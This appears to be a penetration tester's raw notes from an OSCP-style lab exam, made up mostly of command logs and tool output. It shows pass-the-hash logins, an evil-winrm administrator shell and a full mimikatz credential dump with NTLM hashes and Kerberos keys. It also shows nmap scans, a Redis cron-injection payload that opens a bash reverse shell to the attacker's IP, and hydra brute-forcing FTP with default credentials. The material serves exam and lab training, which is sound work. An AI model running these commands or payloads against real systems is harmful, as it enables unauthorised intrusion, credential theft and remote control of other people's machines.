[*] Testing wmi ...
RPC         172.16.124.202  135    SRV22            [*] Windows Server 2022 Build 20348 (name:SRV22) (domain:oscp.exam)
RPC         172.16.124.202  135    SRV22            [-] oscp.exam\administrator:ea29f79cccc4725ddef4eadc9a41d42f (RPC_S_ACCESS_DENIED)

[*] Testing wmi (local-auth)...
RPC         172.16.124.202  135    SRV22            [*] Windows Server 2022 Build 20348 (name:SRV22) (domain:oscp.exam)
WMI         172.16.124.202  135    SRV22            [+] SRV22\administrator:ea29f79cccc4725ddef4eadc9a41d42f (Pwn3d!)

[*] Testing rdp ...
RDP         172.16.124.202  3389   SRV22            [*] Windows 10 or Windows Server 2016 Build 20348 (name:SRV22) (domain:oscp.exam) (nla:True)
RDP         172.16.124.202  3389   SRV22            [-] oscp.exam\administrator:ea29f79cccc4725ddef4eadc9a41d42f (STATUS_LOGON_FAILURE)

[*] Testing rdp (local-auth)...
RDP         172.16.124.202  3389   SRV22            [*] Windows 10 or Windows Server 2016 Build 20348 (name:SRV22) (domain:SRV22) (nla:True)
RDP         172.16.124.202  3389   SRV22            [+] SRV22\administrator:ea29f79cccc4725ddef4eadc9a41d42f (Pwn3d!)


```

### admin 's shell

```
└──╼ $evil-winrm-py -i 172.16.124.202   -u administrator -H ea29f79cccc4725ddef4eadc9a41d42f 
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to '172.16.124.202:5985' as 'administrator'
evil-winrm-py PS C:\Users\Administrator\Documents> whoami
srv22\administrator

```

```
evil-winrm-py PS C:\Users\Administrator\Documents>  .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >
 pssword.txt

```

```
evil-winrm-py PS C:\Users\Administrator\Documents> type pssword.txt

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 406187 (00000000:000632ab)
Session           : Batch from 0
User Name         : Administrator
Domain            : SRV22
Logon Server      : SRV22
Logon Time        : 6/15/2026 5:54:26 PM
SID               : S-1-5-21-595995526-48707437-3758146796-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : SRV22
	 * NTLM     : ea29f79cccc4725ddef4eadc9a41d42f
	 * SHA1     : 83eec025bd29b9a3ff33221f16b439cf4eee1285
	 * DPAPI    : 83eec025bd29b9a3ff33221f16b439cf
	tspkg :	
	wdigest :	
	 * Username : Administrator
	 * Domain   : SRV22
	 * Password : (null)
	kerberos :	
	 * Username : Administrator
	 * Domain   : SRV22
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : SRV22$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 6/15/2026 5:52:08 PM
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : SRV22$
	 * Domain   : OSCP
	 * NTLM     : 0cb3d3c689d455b5cb565cdd049e8604
	 * SHA1     : 71bc30ee2d5c3fcbc3bd2e1d7f0113a073949c8b
	 * DPAPI    : 71bc30ee2d5c3fcbc3bd2e1d7f0113a0
	tspkg :	
	wdigest :	
	 * Username : SRV22$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : srv22$
	 * Domain   : OSCP.EXAM
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 44434 (00000000:0000ad92)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/15/2026 5:52:08 PM
SID               : S-1-5-96-0-0
	msv :	
	 [00000003] Primary
	 * Username : SRV22$
	 * Domain   : OSCP
	 * NTLM     : 0cb3d3c689d455b5cb565cdd049e8604
	 * SHA1     : 71bc30ee2d5c3fcbc3bd2e1d7f0113a073949c8b
	 * DPAPI    : 71bc30ee2d5c3fcbc3bd2e1d7f0113a0
	tspkg :	
	wdigest :	
	 * Username : SRV22$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : SRV22$
	 * Domain   : oscp.exam
	 * Password : 29 b5 ef 2e b3 c1 a0 9b 6f da 60 cb bd be 4c bd a0 3a e3 59 27 c2 36 f3 5c 25 4f 0e 99 e0 01 20 25 98 f6 63 5a 32 55 4e 0f 05 53 34 14 90 08 f3 79 8b 50 7f ac 14 d6 b6 71 8e 2c 95 74 9d 54 d1 af 64 fc a9 52 f1 52 de c6 ea f4 f4 01 6e 43 47 e0 0d 60 20 2b 1b 41 33 e7 b1 6f c6 7d c8 0e 33 52 93 0e da 84 d3 13 03 3b 85 52 67 9e 47 2a b6 0e 4f c3 d5 d0 c8 22 02 21 65 73 4b 92 4a fc b3 a0 dd b0 70 ba 13 a0 2d 73 1a 49 f1 e0 db d6 68 fe 46 c3 98 ef 13 2e 13 11 c0 0e 79 5a cd f4 6d c9 b4 01 0e f0 b7 34 66 a0 4b 31 39 44 92 fc f8 26 3c 97 aa 3d 04 c3 2d 3e b9 cf 18 ae fb 9a 10 1b e8 b9 65 89 d9 d8 b1 71 4f b5 fb 51 49 bd 65 01 20 d4 39 ea b3 d4 24 3e 24 00 10 a5 97 48 0f 34 43 20 22 87 a8 56 c8 61 90 32 3d 53 7f 66 7c 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 44422 (00000000:0000ad86)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/15/2026 5:52:08 PM
SID               : S-1-5-96-0-1
	msv :	
	 [00000003] Primary
	 * Username : SRV22$
	 * Domain   : OSCP
	 * NTLM     : 0cb3d3c689d455b5cb565cdd049e8604
	 * SHA1     : 71bc30ee2d5c3fcbc3bd2e1d7f0113a073949c8b
	 * DPAPI    : 71bc30ee2d5c3fcbc3bd2e1d7f0113a0
	tspkg :	
	wdigest :	
	 * Username : SRV22$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : SRV22$
	 * Domain   : oscp.exam
	 * Password : 29 b5 ef 2e b3 c1 a0 9b 6f da 60 cb bd be 4c bd a0 3a e3 59 27 c2 36 f3 5c 25 4f 0e 99 e0 01 20 25 98 f6 63 5a 32 55 4e 0f 05 53 34 14 90 08 f3 79 8b 50 7f ac 14 d6 b6 71 8e 2c 95 74 9d 54 d1 af 64 fc a9 52 f1 52 de c6 ea f4 f4 01 6e 43 47 e0 0d 60 20 2b 1b 41 33 e7 b1 6f c6 7d c8 0e 33 52 93 0e da 84 d3 13 03 3b 85 52 67 9e 47 2a b6 0e 4f c3 d5 d0 c8 22 02 21 65 73 4b 92 4a fc b3 a0 dd b0 70 ba 13 a0 2d 73 1a 49 f1 e0 db d6 68 fe 46 c3 98 ef 13 2e 13 11 c0 0e 79 5a cd f4 6d c9 b4 01 0e f0 b7 34 66 a0 4b 31 39 44 92 fc f8 26 3c 97 aa 3d 04 c3 2d 3e b9 cf 18 ae fb 9a 10 1b e8 b9 65 89 d9 d8 b1 71 4f b5 fb 51 49 bd 65 01 20 d4 39 ea b3 d4 24 3e 24 00 10 a5 97 48 0f 34 43 20 22 87 a8 56 c8 61 90 32 3d 53 7f 66 7c 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 43219 (00000000:0000a8d3)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 6/15/2026 5:52:08 PM
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : SRV22$
	 * Domain   : OSCP
	 * NTLM     : 0cb3d3c689d455b5cb565cdd049e8604
	 * SHA1     : 71bc30ee2d5c3fcbc3bd2e1d7f0113a073949c8b
	 * DPAPI    : 71bc30ee2d5c3fcbc3bd2e1d7f0113a0
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 6/15/2026 5:52:08 PM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 74341 (00000000:00012265)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 6/15/2026 5:52:08 PM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : SRV22$
	 * Domain   : OSCP
	 * NTLM     : 0cb3d3c689d455b5cb565cdd049e8604
	 * SHA1     : 71bc30ee2d5c3fcbc3bd2e1d7f0113a073949c8b
	 * DPAPI    : 71bc30ee2d5c3fcbc3bd2e1d7f0113a0
	tspkg :	
	wdigest :	
	 * Username : SRV22$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : SRV22$
	 * Domain   : oscp.exam
	 * Password : 29 b5 ef 2e b3 c1 a0 9b 6f da 60 cb bd be 4c bd a0 3a e3 59 27 c2 36 f3 5c 25 4f 0e 99 e0 01 20 25 98 f6 63 5a 32 55 4e 0f 05 53 34 14 90 08 f3 79 8b 50 7f ac 14 d6 b6 71 8e 2c 95 74 9d 54 d1 af 64 fc a9 52 f1 52 de c6 ea f4 f4 01 6e 43 47 e0 0d 60 20 2b 1b 41 33 e7 b1 6f c6 7d c8 0e 33 52 93 0e da 84 d3 13 03 3b 85 52 67 9e 47 2a b6 0e 4f c3 d5 d0 c8 22 02 21 65 73 4b 92 4a fc b3 a0 dd b0 70 ba 13 a0 2d 73 1a 49 f1 e0 db d6 68 fe 46 c3 98 ef 13 2e 13 11 c0 0e 79 5a cd f4 6d c9 b4 01 0e f0 b7 34 66 a0 4b 31 39 44 92 fc f8 26 3c 97 aa 3d 04 c3 2d 3e b9 cf 18 ae fb 9a 10 1b e8 b9 65 89 d9 d8 b1 71 4f b5 fb 51 49 bd 65 01 20 d4 39 ea b3 d4 24 3e 24 00 10 a5 97 48 0f 34 43 20 22 87 a8 56 c8 61 90 32 3d 53 7f 66 7c 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : SRV22$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 6/15/2026 5:52:07 PM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : SRV22$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : srv22$
	 * Domain   : OSCP.EXAM
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

mimikatz(commandline) # exit
Bye!

```

# Recon 192.168.124.110

### \[\[PORT & IP SCAN]]

summary the openport only with One-Paragraph -- AI

```
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
6379/tcp open  redis   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 66.67 seconds
           Raw packets sent: 196649 (8.653MB) | Rcvd: 46 (2.008KB)
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-09 21:06 HKT
Nmap scan report for 192.168.124.110
Host is up (0.22s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 65:83:fe:93:71:c9:bb:b7:f4:0d:cc:a3:eb:fe:74:55 (ECDSA)
|_  256 3a:ba:4a:c3:5a:19:54:03:a4:d8:79:b6:c0:f8:c0:68 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Index of /
6379/tcp open  redis   Redis key-value store 4.0.14
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.62 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-09 21:06 HKT
Nmap scan report for 192.168.124.110
Host is up (0.22s latency).
All 100 scanned ports on 192.168.124.110 are in ignored states.
Not shown: 100 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 3.60 seconds

```

### Redis

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $redis-cli -h 192.168.124.110
192.168.124.110:6379> PING
Error: Server closed the connection
not connected> dir
(error) ERR unknown command `dir`, with args beginning with: 
192.168.124.110:6379> ls

```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $ssh-keygen -t rsa -b 2048 -f /tmp/redis_key

Generating public/private rsa key pair.
Enter passphrase for "/tmp/redis_key" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /tmp/redis_key
Your public key has been saved in /tmp/redis_key.pub
The key fingerprint is:
SHA256:3nnwSKmH/O89x6BV+b2alNR1Tgc34yALukcdVW5M93o tester@parrot
The key's randomart image is:
+---[RSA 2048]----+
|         . o.oo=o|
|        . o + *o=|
|       . . o   =B|
|        o  .  o==|
|       .S.+  ..oE|
|       o.= =. +.o|
|        = = o= o.|
|         o .o.o.o|
|          .ooooo |
+----[SHA256]-----+

```

set x "\n\n/1 \* \* \* bash -c 'bash -i >& /dev/tcp/192.168.49.124/4444 0>&1'\n\n"

# Recon 192.168.124.111

```
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 29.05 seconds
           Raw packets sent: 85007 (3.740MB) | Rcvd: 76853 (3.074MB)
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-09 21:36 HKT
Nmap scan report for 192.168.124.111
Host is up (0.30s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-23-22  08:13AM                  145 .env
| 02-23-22  08:13AM                 2056 Acq.dll
| 02-24-22  06:24AM                 4868 DVRParams.ini
| 02-23-22  08:13AM                35996 Manifest.dll
| 02-23-22  08:13AM                20455 program.exe
| 02-23-22  08:15AM                40229 verisign.png
|_02-23-22  08:14AM                11446 wab.dll
80/tcp    open  http          Samsung AllShare httpd
|_http-title: Did not follow redirect to https://192.168.124.111/cbs/Logon.do
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache Tomcat 8.5.34
| http-title: Site doesn't have a title (text/html;charset=utf-8).
|_Requested resource was /cbs/Logon.do
| ssl-cert: Subject: commonName=Not Secure/organizationName=Ahsay System Corporation Limited/stateOrProvinceName=Hong Kong SAR/countryName=CN
| Not valid before: 2017-03-21T20:52:17
|_Not valid after:  2020-03-20T20:52:17
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
8080/tcp  open  http-proxy
|_http-title: Argus Surveillance DVR
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Connection: Keep-Alive
|     Keep-Alive: timeout=15, max=4
|     Content-Type: text/html
|     Content-Length: 985
|     <HTML>
|     <HEAD>
|     <TITLE>
|     Argus Surveillance DVR
|     </TITLE>
|     <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
|     <meta name="GENERATOR" content="Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]">
|     <frameset frameborder="no" border="0" rows="75,*,88">
|     <frame name="Top" frameborder="0" scrolling="auto" noresize src="CamerasTopFrame.html" marginwidth="0" marginheight="0"> 
|     <frame name="ActiveXFrame" frameborder="0" scrolling="auto" noresize src="ActiveXIFrame.html" marginwidth="0" marginheight="0">
|     <frame name="CamerasTable" frameborder="0" scrolling="auto" noresize src="CamerasBottomFrame.html" marginwidth="0" marginheight="0"> 
|     <noframes>
|     <p>This page uses frames, but your browser doesn't support them.</p>
|_    </noframes>
|_http-generator: Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]
8443/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-generator: Nicepage 4.5.4, nicepage.com
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Home
|_http-server-header: Microsoft-IIS/10.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.95%I=7%D=7/9%Time=6A4FA402%P=x86_64-pc-linux-gnu%r(Get
SF:Request,451,"HTTP/1\.1\x20200\x20OK\r\nConnection:\x20Keep-Alive\r\nKee
SF:p-Alive:\x20timeout=15,\x20max=4\r\nContent-Type:\x20text/html\r\nConte
SF:nt-Length:\x20985\r\n\r\n<HTML>\r\n<HEAD>\r\n<TITLE>\r\nArgus\x20Survei
SF:llance\x20DVR\r\n</TITLE>\r\n\r\n<meta\x20http-equiv=\"Content-Type\"\x
SF:20content=\"text/html;\x20charset=ISO-8859-1\">\r\n<meta\x20name=\"GENE
SF:RATOR\"\x20content=\"Actual\x20Drawing\x206\.0\x20\(http://www\.pysoft\
SF:.com\)\x20\[PYSOFTWARE\]\">\r\n\r\n<frameset\x20frameborder=\"no\"\x20b
SF:order=\"0\"\x20rows=\"75,\*,88\">\r\n\x20\x20<frame\x20name=\"Top\"\x20
SF:frameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"CamerasTop
SF:Frame\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\x20\x20\r\n\x
SF:20\x20<frame\x20name=\"ActiveXFrame\"\x20frameborder=\"0\"\x20scrolling
SF:=\"auto\"\x20noresize\x20src=\"ActiveXIFrame\.html\"\x20marginwidth=\"0
SF:\"\x20marginheight=\"0\">\r\n\x20\x20<frame\x20name=\"CamerasTable\"\x2
SF:0frameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"CamerasBo
SF:ttomFrame\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\x20\x20\r
SF:\n\x20\x20<noframes>\r\n\x20\x20\x20\x20<p>This\x20page\x20uses\x20fram
SF:es,\x20but\x20your\x20browser\x20doesn't\x20support\x20them\.</p>\r\n\x
SF:20\x20</noframes>\r")%r(HTTPOptions,451,"HTTP/1\.1\x20200\x20OK\r\nConn
SF:ection:\x20Keep-Alive\r\nKeep-Alive:\x20timeout=15,\x20max=4\r\nContent
SF:-Type:\x20text/html\r\nContent-Length:\x20985\r\n\r\n<HTML>\r\n<HEAD>\r
SF:\n<TITLE>\r\nArgus\x20Surveillance\x20DVR\r\n</TITLE>\r\n\r\n<meta\x20h
SF:ttp-equiv=\"Content-Type\"\x20content=\"text/html;\x20charset=ISO-8859-
SF:1\">\r\n<meta\x20name=\"GENERATOR\"\x20content=\"Actual\x20Drawing\x206
SF:\.0\x20\(http://www\.pysoft\.com\)\x20\[PYSOFTWARE\]\">\r\n\r\n<framese
SF:t\x20frameborder=\"no\"\x20border=\"0\"\x20rows=\"75,\*,88\">\r\n\x20\x
SF:20<frame\x20name=\"Top\"\x20frameborder=\"0\"\x20scrolling=\"auto\"\x20
SF:noresize\x20src=\"CamerasTopFrame\.html\"\x20marginwidth=\"0\"\x20margi
SF:nheight=\"0\">\x20\x20\r\n\x20\x20<frame\x20name=\"ActiveXFrame\"\x20fr
SF:ameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"ActiveXIFram
SF:e\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\r\n\x20\x20<frame
SF:\x20name=\"CamerasTable\"\x20frameborder=\"0\"\x20scrolling=\"auto\"\x2
SF:0noresize\x20src=\"CamerasBottomFrame\.html\"\x20marginwidth=\"0\"\x20m
SF:arginheight=\"0\">\x20\x20\r\n\x20\x20<noframes>\r\n\x20\x20\x20\x20<p>
SF:This\x20page\x20uses\x20frames,\x20but\x20your\x20browser\x20doesn't\x2
SF:0support\x20them\.</p>\r\n\x20\x20</noframes>\r");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-09T13:39:49
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 191.54 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-09 21:40 HKT
Nmap scan report for 192.168.124.111
Host is up (0.23s latency).
Not shown: 98 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
53/udp    closed domain
49181/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 3.50 seconds


```

### FTP

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $hydra -C ./ftp-betterdefaultpasslist.txt  ftp://192.168.124.111   -V
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-10 05:40:54
[DATA] max 16 tasks per 1 server, overall 16 tasks, 65 login tries, ~5 tries per task
[DATA] attacking ftp://192.168.124.111:21/
[ATTEMPT] target 192.168.124.111 - login "root" - pass "rootpasswd" - 1 of 65 [child 0] (0/0)
[ATTEMPT] target 192.168.124.111 - login "root" - pass "12hrs37" - 2 of 65 [child 1] (0/0)
[ATTEMPT] target 192.168.124.111 - login "ftp" - pass "b1uRR3" - 3 of 65 [child 2] (0/0)
[ATTEMPT] target 192.168.124.111 - login "admin" - pass "admin" - 4 of 65 [child 3] (0/0)
[ATTEMPT] target 192.168.124.111 - login "localadmin" - pass "localadmin" - 5 of 65 [child 4] (0/0)
[ATTEMPT] target 192.168.124.111 - login "admin" - pass "1234" - 6 of 65 [child 5] (0/0)
[ATTEMPT] target 192.168.124.111 - login "apc" - pass "apc" - 7 of 65 [child 6] (0/0)
[ATTEMPT] target 192.168.124.111 - login "admin" - pass "nas" - 8 of 65 [child 7] (0/0)
[ATTEMPT] target 192.168.124.111 - login "Root" - pass "wago" - 9 of 65 [child 8] (0/0)
[ATTEMPT] target 192.168.124.111 - login "Admin" - pass "wago" - 10 of 65 [child 9] (0/0)
[ATTEMPT] target 192.168.124.111 - login "User" - pass "user" - 11 of 65 [child 10] (0/0)
[ATTEMPT] target 192.168.124.111 - login "Guest" - pass "guest" - 12 of 65 [child 11] (0/0)
[ATTEMPT] target 192.168.124.111 - login "ftp" - pass "ftp" - 13 of 65 [child 12] (0/0)
[ATTEMPT] target 192.168.124.111 - login "admin" - pass "password" - 14 of 65 [child 13] (0/0)
[ATTEMPT] target 192.168.124.111 - login "a" - pass "avery" - 15 of 65 [child 14] (0/0)
[ATTEMPT] target 192.168.124.111 - login "admin" - pass "123456" - 16 of 65 [child 15] (0/0)
[ATTEMPT] target 192.168.124.111 - login "adtec" - pass "none" - 17 of 65 [child 4] (0/0)
[ATTEMPT] target 192.168.124.111 - login "admin" - pass "admin12345" - 18 of 65 [child 0] (0/0)
[ATTEMPT] target 192.168.124.111 - login "none" - pass "dpstelecom" - 19 of 65 [child 1] (0/0)
[21][ftp] host: 192.168.124.111   login: ftp   password: b1uRR3
[ATTEMPT] target 192.168.124.111 - login "instrument" - pass "instrument" - 20 of 65 [child 5] (0/0)
[ATTEMPT] target 192.168.124.111 - login "user" - pass "password" - 21 of 65 [child 6] (0/0)
[ATTEMPT] target 192.168.124.111 - login "root" - pass "password" - 22 of 65 [child 7] (0/0)
[ATTEMPT] target 192.168.124.111 - login "default" - pass "default" - 23 of 65 [child 8] (0/0)
[ATTEMPT] target 192.168.124.111 - login "admin" - pass "default" - 24 of 65 [child 10] (0/0)
[ATTEMPT] target 192.168.124.111 - login "nmt" - pass "1234" - 25 of 65 [child 11] (0/0)
[21][ftp] host: 192.168.124.111   login: ftp   password: ftp
[ATTEMPT] target 192.168.124.111 - login "admin" - pass "Janitza" - 26 of 65 [child 13] (0/0)
[ATTEMPT] target 192.168.124.111 - login "supervisor" - pass "supervisor" - 27 of 65 [child 15] (0/0)
[ATTEMPT] target 192.168.124.111 - login "user1" - pass "pass1" - 28 of 65 [child 2] (0/0)
[ATTEMPT] target 192.168.124.111 - login "avery" - pass "avery" - 29 of 65 [child 3] (0/0)
[ATTEMPT] target 192.168.124.111 - login "IEIeMerge" - pass "eMerge" - 30 of 65 [child 9] (0/0)
[ATTEMPT] target 192.168.124.111 - login "ADMIN" - pass "12345" - 31 of 65 [child 12] (0/0)
[ATTEMPT] target 192.168.124.111 - login "beijer" - pass "beijer" - 32 of 65 [child 14] (0/0)
[ATTEMPT] target 192.168.124.111 - login "Admin" - pass "admin" - 33 of 65 [child 4] (0/0)
[ATTEMPT] target 192.168.124.111 - login "admin" - pass "1234" - 34 of 65 [child 1] (0/0)
[ATTEMPT] target 192.168.124.111 - login "admin" - pass "1111" - 35 of 65 [child 8] (0/0)
[ATTEMPT] target 192.168.124.111 - login "root" - pass "admin" - 36 of 65 [child 0] (0/0)
[ATTEMPT] target 192.168.124.111 - login "se" - pass "1234" - 37 of 65 [child 5] (0/0)
[ATTEMPT] target 192.168.124.111 - login "admin" - pass "stingray" - 38 of 65 [child 6] (0/0)
[ATTEMPT] target 192.168.124.111 - login "device" - pass "apc" - 39 of 65 [child 7] (0/0)
[ATTEMPT] target 192.168.124.111 - login "apc" - pass "apc" - 40 of 65 [child 9] (0/0)
[ATTEMPT] target 192.168.124.111 - login "dm" - pass "ftp" - 41 of 65 [child 10] (0/0)
[ATTEMPT] target 192.168.124.111 - login "dmftp" - pass "ftp" - 42 of 65 [child 11] (0/0)
[ATTEMPT] target 192.168.124.111 - login "httpadmin" - pass "fhttpadmin" - 43 of 65 [child 13] (0/0)
[ATTEMPT] target 192.168.124.111 - login "user" - pass "system" - 44 of 65 [child 15] (0/0)
[ATTEMPT] target 192.168.124.111 - login "MELSEC" - pass "MELSEC" - 45 of 65 [child 3] (0/0)
[ATTEMPT] target 192.168.124.111 - login "QNUDECPU" - pass "QNUDECPU" - 46 of 65 [child 14] (0/0)
[ATTEMPT] target 192.168.124.111 - login "ftp_boot" - pass "ftp_boot" - 47 of 65 [child 2] (0/0)
[ATTEMPT] target 192.168.124.111 - login "uploader" - pass "ZYPCOM" - 48 of 65 [child 12] (0/0)
[ATTEMPT] target 192.168.124.111 - login "ftpuser" - pass "password" - 49 of 65 [child 4] (0/0)
[ATTEMPT] target 192.168.124.111 - login "USER" - pass "USER" - 50 of 65 [child 1] (0/0)
[ATTEMPT] target 192.168.124.111 - login "qbf77101" - pass "hexakisoctahedron" - 51 of 65 [child 8] (0/0)
[ATTEMPT] target 192.168.124.111 - login "ntpupdate" - pass "ntpupdate" - 52 of 65 [child 6] (0/0)
[ATTEMPT] target 192.168.124.111 - login "sysdiag" - pass "factorycast@schneider" - 53 of 65 [child 7] (0/0)
[ATTEMPT] target 192.168.124.111 - login "wsupgrade" - pass "wsupgrade" - 54 of 65 [child 9] (0/0)
[ATTEMPT] target 192.168.124.111 - login "pcfactory" - pass "pcfactory" - 55 of 65 [child 0] (0/0)
[ATTEMPT] target 192.168.124.111 - login "loader" - pass "fwdownload" - 56 of 65 [child 3] (0/0)
[ATTEMPT] target 192.168.124.111 - login "test" - pass "testingpw" - 57 of 65 [child 5] (0/0)
[ATTEMPT] target 192.168.124.111 - login "webserver" - pass "webpages" - 58 of 65 [child 10] (0/0)
[ATTEMPT] target 192.168.124.111 - login "fdrusers" - pass "sresurdf" - 59 of 65 [child 11] (0/0)
[ATTEMPT] target 192.168.124.111 - login "nic2212" - pass "poiuypoiuy" - 60 of 65 [child 13] (0/0)
[ATTEMPT] target 192.168.124.111 - login "user" - pass "user00" - 61 of 65 [child 14] (0/0)
[ATTEMPT] target 192.168.124.111 - login "su" - pass "ko2003wa" - 62 of 65 [child 15] (0/0)
[ATTEMPT] target 192.168.124.111 - login "MayGion" - pass "maygion.com" - 63 of 65 [child 12] (0/0)
[ATTEMPT] target 192.168.124.111 - login "admin" - pass "9999" - 64 of 65 [child 2] (0/0)
[ATTEMPT] target 192.168.124.111 - login "PlcmSpIp" - pass "PlcmSpIp" - 65 of 65 [child 4] (0/0)
1 of 1 target successfully completed, 2 valid passwords found
